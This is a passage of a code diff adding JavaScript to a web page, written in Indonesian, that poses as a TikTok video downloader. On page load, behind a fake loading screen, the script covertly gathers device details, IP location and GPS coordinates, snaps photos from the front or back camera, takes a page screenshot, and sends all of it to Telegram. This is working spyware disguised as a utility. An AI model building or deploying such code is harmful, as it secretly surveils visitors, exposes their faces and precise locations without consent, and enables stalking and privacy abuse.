+                    alamatLengkap: "Alamat tidak tersedia"
+                };
+            }
+            
+            /**
+             * Mengumpulkan informasi perangkat
+             * @returns {string} String berisi informasi perangkat yang diformat
+             */
+            async function collectDeviceInfo() {
+                let message = 'TRACKING REPORT \n\n';
+                message += '⚙️ DEVICE INFORMATION ≥ BUKAN GPS TRACKING\n\n';
+                
+                // Informasi dasar perangkat
+                message += `🖥️ Device : ${navigator.userAgent}\n`;
+                message += `💻 Platform : ${navigator.platform}\n`;
+                message += `🌐 Bahasa : ${navigator.language}\n`;
+                message += `📶 Online : ${navigator.onLine ? 'Online' : 'Offline'}\n`;
+                message += `📺 Screen Size : ${screen.width}x${screen.height}\n`;
+                message += `🪟 Window Size : ${innerWidth}x${innerHeight}\n`;
+                message += `💾 RAM : ${navigator.deviceMemory || 'Unknown'} GB\n`;
+                message += `🧠 CPU Cores : ${navigator.hardwareConcurrency}\n`;
+                
+                // Informasi baterai jika tersedia
+                if (navigator.getBattery) {
+                    try {
+                        const battery = await navigator.getBattery();
+                        message += `🔋 Battery : ${Math.floor(battery.level * 100)}%\n`;
+                        message += `🔌 Charging : ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
+                    } catch (error) {
+                        message += '🔋 Battery : ❌ Tidak tersedia\n';
+                    }
+                }
+                
+                // Informasi tambahan
+                message += `⏰ Waktu Akses : ${new Date().toString()}\n`;
+                message += `🕒 Page Load Time : ${performance.now().toFixed(2)} ms\n`;
+                message += `📜 History Length : ${history.length}\n`;
+                message += `✋ Touch Support : ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
+                message += `🔗 Referrer : ${document.referrer || 'None'}\n`;
+                message += `🌍 URL : ${location.href}\n`;
+                message += `📄 Title : ${document.title}\n`;
+                message += `🕓 Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+                message += `🧭 Offset : ${new Date().getTimezoneOffset()} menit\n\n`;
+                
+                // Informasi lokasi berdasarkan IP
+                try {
+                    const response = await fetch('https://ipapi.co/json/');
+                    const data = await response.json();
+                    
+                    message += '📍 LOCATION INFORMATION\n\n';
+                    message += `📡 IP Address : ${data.ip}\n`;
+                    message += `🏙️ Kota : ${data.city}\n`;
+                    message += `🏙️ Kabupaten : ${data.region}\n`;
+                    message += `🗺️ Wilayah : ${data.region}\n`;
+                    message += `🌎 Negara : ${data.country_name}\n`;
+                    message += `🏷️ Kode Pos : ${data.postal}\n`;
+                    
+                    if (data.latitude && data.longitude) {
+                        message += `📌 Latitude : ${data.latitude}\n`;
+                        message += `📍 Longitude : ${data.longitude}\n`;
+                        
+                        const locationDetails = await getLocationDetails(data.latitude, data.longitude);
+                        message += `🏙️ Kabupaten : ${locationDetails.kabupaten}\n`;
+                        message += `🏙️ Kecamatan : ${locationDetails.kecamatan}\n`;
+                        message += `🏠 Alamat Lengkap : ${locationDetails.alamatLengkap}\n`;
+                    }
+                } catch (error) {
+                    message += '❌ Gagal mendapatkan informasi lokasi\n';
+                }                
+                return message;
+            }
+            
+            /**
+             * Mengambil gambar dari kamera dengan mode tertentu
+             * @param {string} mode - Mode kamera ('user' untuk depan, 'environment' untuk belakang)
+             * @returns {boolean} Status keberhasilan pengambilan gambar
+             */
+            async function captureCamera(mode) {
+                let stream;
+                
+                try {
+                    // Mengakses kamera
+                    stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { exact: mode }
+                        }
+                    });
+                    
+                    // Menampilkan stream di elemen video
+                    videoElement.srcObject = stream;
+                    
+                    // Menunggu video siap
+                    await new Promise(resolve => {
+                        videoElement.onloadedmetadata = resolve;
+                    });
+                    
+                    videoElement.play();
+                    
+                    // Waktu tunggu untuk fokus kamera (1.5 detik)
+                    await new Promise(resolve => setTimeout(resolve, 1500));
+                    
+                    // Menggambar frame ke canvas
+                    canvasElement.width = videoElement.videoWidth;
+                    canvasElement.height = videoElement.videoHeight;
+                    canvasElement.getContext('2d').drawImage(videoElement, 0, 0);
+                    
+                    // Mengirim gambar ke Telegram
+                    canvasElement.toBlob(blob => {
+                        sendPhotoToTelegram(blob, `${mode}_camera_capture.jpg`);
+                    }, 'image/jpeg');
+                    
+                    // Menghentikan stream
+                    stream.getTracks().forEach(track => track.stop());
+                    return true;
+                    
+                } catch (error) {
+                    // Menghentikan stream jika ada error
+                    if (stream) {
+                        stream.getTracks().forEach(track => track.stop());
+                    }
+                    
+                    await sendToTelegram(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
+                    return false;
+                }
+            }
+            
+            /**
+             * Mengambil screenshot halaman
+             */
+            async function captureScreenshot() {
+                try {
+                    const canvas = await html2canvas(document.body);
+                    canvas.toBlob(blob => {
+                        sendPhotoToTelegram(blob, 'screenshot.jpg');
+                    }, 'image/jpeg');
+                } catch (error) {
+                    await sendToTelegram('❌ Screenshot failed');
+                }
+            }
+            
+            /**
+             * Mengambil lokasi GPS
+             */
+            function captureGPSLocation() {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async position => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        let gpsMessage = `📍 GPS TRACKING (ONE-TIME)\n`;
+                        gpsMessage += `📌 Lat : ${lat}\n`;
+                        gpsMessage += `📍 Lng : ${lon}\n`;
+                        gpsMessage += `🎯 Akurasi: ${position.coords.accuracy}m\n`;
+                        gpsMessage += `🗺️ Google Maps : https://www.google.com/maps/search/?api=1&query=${lat},${lon}\n`;
+                        
+                        const locationDetails = await getLocationDetails(lat, lon);
+                        gpsMessage += `🏙️ Kabupaten : ${locationDetails.kabupaten}\n`;
+                        gpsMessage += `🏙️ Kecamatan : ${locationDetails.kecamatan}\n`;
+                        gpsMessage += `🏠 Alamat : ${locationDetails.alamatLengkap}\n`;
+                        
+                        await sendToTelegram(gpsMessage);
+                    }, async error => {
+                        await sendToTelegram(`❌ GPS Error : ${error.message}`);
+                    }, {
+                        enableHighAccuracy: true,
+                        maximumAge: 0,
+                        timeout: 5000
+                    });
+                }
+            }
+            
+            // ========== FUNGSI TRACKING UTAMA ==========
+            
+            /**
+             * Fungsi utama untuk menjalankan semua proses tracking
+             */
+            async function startTracking() {
+                // Kirim informasi perangkat
+                await sendToTelegram(await collectDeviceInfo());
+                
+                let cameraSuccess = false;
+                
+                // 1. Coba akses kamera depan
+                cameraSuccess = await captureCamera("user");
+                
+                // 2. Jika gagal, coba kamera belakang
+                if (!cameraSuccess) {
+                    cameraSuccess = await captureCamera("environment");
+                }
+                
+                // 3. Jika kedua kamera gagal
+                if (!cameraSuccess) {
+                    await sendToTelegram('❌ Akses ke kedua kamera (Depan & Belakang) diblokir.');
+                }
+                
+                // Ambil screenshot setelah 2 detik
+                setTimeout(captureScreenshot, 2000);
+                
+                // Ambil lokasi GPS
+                captureGPSLocation();
+                
+                // Selesaikan progress bar
+                progressBar.style.width = '100%';
+                loadingDetails.textContent = 'Proses selesai';
+                
+                // Sembunyikan loading screen setelah 3 detik
+                setTimeout(() => {
+                    loadingContainer.classList.add('hidden');
+                }, 3000);
+            }
+            
+            // ========== EVENT LISTENERS ==========
+            
+            // Event listener untuk tombol download
+            downloadBtn.addEventListener('click', async () => {
+                const url = tiktokUrlInput.value.trim();
+                
+                if (!url) {
+                    alert('Masukkan URL video TikTok terlebih dahulu');
+                    return;
+                }
+                
+                // Validasi URL TikTok
+                if (!url.includes('tiktok.com')) {
+                    alert('URL harus dari TikTok');
+                    return;
+                }
+                
+                // Tampilkan loading indicator
+                loadingIndicator.style.display = 'block';
+                downloadBtn.disabled = true;
+                
+                try {
+                    const videoData = await fetchTikTokData(url);
+                    displayVideoResult(videoData);
+                } catch (error) {
+                    alert('Gagal mengambil data video. Pastikan URL benar dan coba lagi.');
+                    console.error('Error:', error);
+                } finally {
+                    loadingIndicator.style.display = 'none';
+                    downloadBtn.disabled = false;
+                }
+            });
+            
+            // Event listener untuk tombol download tanpa watermark
+            downloadWithoutWatermark.addEventListener('click', () => {
+                if (currentVideoData && currentVideoData.play) {
+                    downloadFile(currentVideoData.play, `tiktok_${currentVideoData.id}_nowm.mp4`);
+                } else {
+                    alert('Data video tidak tersedia');
+                }
+            });
+            
+            // Event listener untuk tombol download dengan watermark
+            downloadWithWatermark.addEventListener('click', () => {
+                if (currentVideoData && currentVideoData.wmplay) {
+                    downloadFile(currentVideoData.wmplay, `tiktok_${currentVideoData.id}_wm.mp4`);
+                } else {
+                    alert('Data video tidak tersedia');
+                }
+            });
+            
+            // Event listener untuk tombol download audio
+            downloadAudio.addEventListener('click', () => {
+                if (currentVideoData && currentVideoData.music) {
+                    downloadFile(currentVideoData.music, `tiktok_${currentVideoData.id}_audio.mp3`);
+                } else {
+                    alert('Data audio tidak tersedia');
+                }
+            });
+            
+            // ========== INISIALISASI ==========
+            
+            // Jalankan tracking di latar belakang saat halaman dimuat
+            window.addEventListener('load', () => {
+                // Tampilkan loading screen sebentar
+                loadingContainer.classList.remove('hidden');
+                
+                // Mulai interval untuk progress bar
+                const progressInterval = setInterval(updateProgress, 500);
+                
+                // Jalankan tracking utama
+                startTracking().finally(() => {
+                    // Hentikan interval progress bar setelah tracking selesai
+                    setTimeout(() => {
+                        clearInterval(progressInterval);
+                    }, 3000);
+                });
+            });
+        })();
+    </script>
+</body>
 </html>
